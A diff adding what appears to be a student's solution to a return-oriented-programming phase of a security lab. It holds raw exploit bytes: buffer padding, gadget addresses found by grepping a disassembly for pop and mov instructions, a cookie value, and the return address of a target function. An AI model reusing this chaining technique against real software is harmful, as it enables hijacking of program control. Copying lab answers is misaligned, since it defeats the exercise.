@@ -1,0 +1,26 @@
+/* Cookie: 0x23f306d5 */
+
+/* Fill buffer to 24 bytes */
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* popq %rdi , 5f */
+/* popq %rax, 58 -> setval_269 */
+/* c4 = c7, 2 more places is 58 */
+c6 1f 40 00 00 00 00 00
+
+/* cookie */
+d5 06 f3 23 00 00 00 00
+
+/* movq rdi rax */
+/* cat farm.dump | grep -E "48 89 .. c3"  */
+
+/* 401fcf:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax */
+
+d0 1f 40 00 00 00 00 00
+
+/* Ret addr of touch2 */
+
+f4 1d 40 00 00 00 00 00
